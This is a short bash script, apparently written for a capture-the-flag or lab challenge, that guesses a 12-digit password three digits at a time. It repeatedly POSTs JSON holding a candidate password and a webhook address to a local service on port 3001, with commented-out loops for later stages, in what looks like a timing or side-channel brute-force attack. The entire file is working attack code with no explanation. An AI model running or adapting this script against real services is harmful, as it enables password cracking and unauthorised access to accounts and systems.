for i in $(seq 120 130)
do
  echo `printf %03d000000000 $i`
  curl localhost:3001  -d "{\"password\": \"`printf %03d $i`000000000\", \"webhooks\": [\"localhost:58934\"]}" > /dev/null 2> /dev/null
  curl localhost:3001  -d "{\"password\": \"`printf %03d $i`000000000\", \"webhooks\": [\"localhost:58934\"]}" > /dev/null 2> /dev/null
  curl localhost:3001  -d "{\"password\": \"`printf %03d $i`000000000\", \"webhooks\": [\"localhost:58934\"]}" > /dev/null 2> /dev/null
  curl localhost:3001  -d "{\"password\": \"`printf %03d $i`000000000\", \"webhooks\": [\"localhost:58934\"]}" > /dev/null 2> /dev/null
  sleep 0.1

done

# for i in $(seq 0 999)
# do
#   echo `printf %03d $i`
#   curl localhost:3001  -d "{\"password\": \"012`printf %03d $i`000000\", \"webhooks\": [\"localhost:58934\", \"localhost:58934\"]}" > /dev/null 2> /dev/null
#   sleep 0.1

# done

# for i in $(seq 0 999)
# do
#   echo `printf %03d $i`
#   curl localhost:3001  -d "{\"password\": \"012345`printf %03d $i`000\", \"webhooks\": [\"localhost:58934\", \"localhost:58934\"]}" > /dev/null 2> /dev/null
#   sleep 0.1

# done

# for i in $(seq 0 999)
# do
#   echo `printf %03d $i`
#   curl localhost:3001  -d "{\"password\": \"012345678`printf %03d $i`\", \"webhooks\": [\"localhost:58934\", \"localhost:58934\"]}" > /dev/null 2> /dev/null
#   sleep 0.1

# done

